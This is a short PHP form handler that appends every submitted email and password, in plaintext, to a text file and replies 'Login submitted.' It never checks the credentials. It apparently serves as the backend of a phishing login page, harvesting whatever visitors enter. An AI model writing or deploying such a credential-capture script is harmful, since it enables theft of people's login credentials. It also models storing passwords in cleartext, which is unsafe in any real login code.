<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $data = "Login Attempt - Email: $email, Password: $password\n";
    file_put_contents("login_attempts.txt", $data, FILE_APPEND);

    echo "Login submitted.";
}
?>
